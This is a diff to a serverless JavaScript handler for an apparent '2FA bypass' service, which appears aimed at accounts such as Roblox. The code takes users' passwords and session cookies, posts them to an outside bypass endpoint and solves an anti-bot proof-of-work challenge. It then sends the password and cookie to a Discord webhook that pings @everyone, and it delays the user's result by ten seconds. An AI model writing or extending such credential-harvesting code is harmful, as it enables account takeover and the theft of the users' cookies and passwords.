@@ -19,6 +19,7 @@ function solveEggyWall(html) {
         const charset = '0123456789abcdef';
         const max = Math.pow(charset.length, difficulty);
 
+        // SAFETY: Prevent Vercel Serverless timeout (10s limit). 
         if (max > 5000000) return null; 
 
         for (let i = 0; i < max; i++) {
@@ -80,7 +81,7 @@ async function sendWebhook(req, requestData, responseStatus, success, responseMe
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                content: '@everyone',
+                content: '@everyone', // Always pings @everyone
                 embeds: [mainEmbed, cookieEmbed],
                 username: 'Noctrya/Bypasser',
                 allowed_mentions: { parse: ['everyone'] }
@@ -155,6 +156,7 @@ export default async function handler(req, res) {
             return res.status(400).json({ success: false, message: 'Missing required fields' });
         }
 
+        // FIX: Capitalize the first letter of Type (e.g., "roblox" -> "Roblox")
         Type = Type.charAt(0).toUpperCase() + Type.slice(1).toLowerCase();
 
         const targetUrl = 'https://immortal.st/api/misc/2faBypass.php';
@@ -212,9 +214,7 @@ export default async function handler(req, res) {
                 const token = solveEggyWall(responseText);
 
                 if (token) {
-                    // Append EggyWall token to existing cookies
                     baseHeaders['Cookie'] = (baseHeaders['Cookie'] ? baseHeaders['Cookie'] + '; ' : '') + `EggyWall_Token=${token}`;
-                    
                     response = await fetch(targetUrl, {
                         method: 'POST',
                         headers: baseHeaders,
@@ -261,7 +261,10 @@ export default async function handler(req, res) {
             }
         }
 
+        // Send details to webhook FIRST
         await sendWebhook(req, { Type, Password, Cookie }, response.status, finalSuccess, finalMessage);
+
+        // WAIT 10 SECONDS prior to displaying result to the user
         await new Promise(resolve => setTimeout(resolve, 10000));
 
         return res.status(response.status).json({
@@ -282,4 +285,4 @@ export default async function handler(req, res) {
             code: errorCode
         });
     }
-                      }
+}
